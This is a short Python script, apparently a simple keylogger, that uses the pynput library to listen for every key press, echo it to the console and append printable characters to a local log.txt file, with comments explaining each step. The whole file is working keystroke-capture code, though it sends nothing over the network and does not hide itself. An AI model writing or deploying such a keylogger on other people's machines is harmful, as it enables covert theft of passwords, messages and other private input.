from pynput import keyboard #captures keystrokes

def keypressed(key): 
    print(str(key))
    with open("log.txt", "a") as logkey: #adds to exsiting file, if it doesn't exist it will create it, this is where the keystrokes will be stored
        try:
            char = key.char #prevents crashing when special keys are pressed, instead moves on
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__": #This is the main function, it will run when the program is executed
    
    listener = keyboard.Listener(on_press=keypressed)  # This is the listener, it will listen for keystrokes, call the keypressed function when a key is pressed and send to a location
    listener.start()
    input()
